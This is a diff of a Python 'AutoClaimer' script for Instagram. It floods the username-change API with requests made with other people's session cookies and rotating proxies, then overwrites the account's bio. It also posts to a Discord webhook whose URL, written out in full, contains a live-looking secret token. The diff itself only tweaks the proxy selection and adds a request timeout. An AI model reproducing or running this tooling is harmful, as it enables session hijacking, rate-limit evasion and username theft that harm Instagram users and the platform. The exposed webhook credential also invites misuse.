@@ -47,7 +47,7 @@ clearConsle = lambda: os.system('cls')
 dude = """
 
     * AutoClaimer Instagram * 
-
+    
         Targrt Mode + list mode 
         ./ Made By FD § FBI
 
@@ -148,11 +148,9 @@ class Auto():
 
 
     def proxy(self):
-        self.contorlthreads.wait()
-        while 1:
-            self.prox = random.choice(self.proxies)
-            self.erp = {"http": f"{self.prox}", "https": f"{self.prox}"}
-            return self.erp
+        self.prox = random.choice(self.proxies)
+        self.erp = {"http": f"{self.prox}", "https": f"{self.prox}"}
+        return self.erp
     def Done(self,Sessions,user):
         requests.post('https://i.instagram.com/api/v1/accounts/set_biography/',data={"raw_text": f"{by}"},headers={"User-Agent": "Instagram 152.0.0.1.60 Android","Cookie": "sessionid=" + Sessions})
         webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/810840907887804426/TwSqCHrKD1QR4hMnkHP48t8OnrrjsO4QcpjRlGJHh2vS9z4w9-gvEINazuaOp_P2gDlf")
@@ -171,7 +169,7 @@ class Auto():
             try:
                 user = self.random_usernames()
                 Sessions = self.random_session()
-                self.request = [self.future_session.post(f'https://{self.random_sub_domin()}/api/v1/accounts/set_username/', headers={"User-Agent": "Instagram 152.0.0.1.60 Android","Cookie": "sessionid=" + Sessions}, data={"username": user},proxies=self.proxy()) for _ in range(self.skip)]
+                self.request = [self.future_session.post(f'https://{self.random_sub_domin()}/api/v1/accounts/set_username/', headers={"User-Agent": "Instagram 152.0.0.1.60 Android","Cookie": "sessionid=" + Sessions}, data={"username": user},proxies=self.proxy(),timeout=1) for _ in range(self.skip)]
                 for self.req in as_completed(self.request):
                     with self.req.result() as self.response:
                         #print(self.response.text)
